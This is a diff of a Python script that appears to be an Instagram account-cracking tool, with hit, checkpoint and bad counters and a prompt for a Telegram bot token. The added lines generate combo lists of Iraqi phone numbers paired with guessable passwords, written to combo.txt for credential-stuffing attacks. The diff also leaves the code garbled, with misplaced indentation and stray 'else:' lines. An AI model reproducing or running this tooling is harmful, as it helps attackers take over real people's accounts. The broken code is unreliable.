@@ -124,6 +124,10 @@ def instagram1():
 	from user_agent import generate_user_agent
 	from datetime import datetime
 	r = requests.session()
+    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+	ID=input("    Your ID Telegram :")
+	token=input("    Token(bot) : ")
+else:
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
@@ -205,6 +209,17 @@ def instagram1():
 ################################################################################################
 def instagram2():
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+    import sys, random, os
+for lol in range(10000):
+    sys.stdout=open("combo.txt", "a")
+    r=random.randint(1000000, 9999999)
+    rr=random.randint(1000000, 9999999)
+    print("+964770"+str(r)+":"+str(r))
+    print("+964750"+str(rr)+":"+str(rr))
+if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+	ID=input("    Your ID Telegram :")
+	token=input("    Token(bot) : ")
+else:
 	def loopPp():
 		try:
 			global bad, timeout, checkpoint, error, hits
@@ -294,6 +309,17 @@ def instagram3():
 	from datetime import datetime
 	r = requests.session()    
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+    for loll in range(10000):
+	import sys
+	sys.stdout=open("combo.txt", "a")
+	r=random.randint(1000000, 9999999)
+	rr=random.randint(1000000, 9999999)
+	print("+964770"+str(r)+":0770"+str(r))
+	print("+964750"+str(rr)+":0750"+str(rr))
+if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+ 	ID=input("    Your ID Telegram :")
+ 	token=input("    Token(bot) : ")
+else:
 	def loopPp():
 		try:
 			global bad, timeout, checkpoint, error, hits
@@ -489,40 +515,6 @@ def instagram4():
 ################################################################################################
 ################################################################################################
 ###############################################################
-def i1():
-    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-    	ID=input("    Your ID Telegram :")
-    	token=input("    Token(bot) : ")
-    else:
-        instgram1()
-def i2():
-    import sys, random, os
-    for lol in range(10000):
-        sys.stdout=open("combo.txt", "a")
-        r=random.randint(1000000, 9999999)
-        rr=random.randint(1000000, 9999999)
-        print("+964770"+str(r)+":"+str(r))
-        print("+964750"+str(rr)+":"+str(rr))
-    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-    	ID=input("    Your ID Telegram :")
-    	token=input("    Token(bot) : ")
-    else:
-        instgram2()
-def i3():
-	for loll in range(10000):
-		import sys
-		sys.stdout=open("combo.txt", "a")
-		r=random.randint(1000000, 9999999)
-		rr=random.randint(1000000, 9999999)
-		print("+964770"+str(r)+":0770"+str(r))
-		print("+964750"+str(rr)+":0750"+str(rr))
-	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-	 	ID=input("    Your ID Telegram :")
-	 	token=input("    Token(bot) : ")
-	else:
-	 	instagram3()
-    
-     
 def dwbara():
     import json, requests, user_agent,os ,sys, time, datetime
     logo=(W+G+'''
@@ -554,13 +546,13 @@ def dwbara():
     print(logo)
     i=input("    Choese: ")
     if i=="1":
-        i1()
+        instgram1()
     elif i=="2":
-        i2()
+        instgram2()
     elif i=="3":
-        i3()
+        instgram3()
     elif i=="4":
-        i4()
+        instgram4()
     elif i=="0":
         print(" Exit !")
         os.sys.exit()
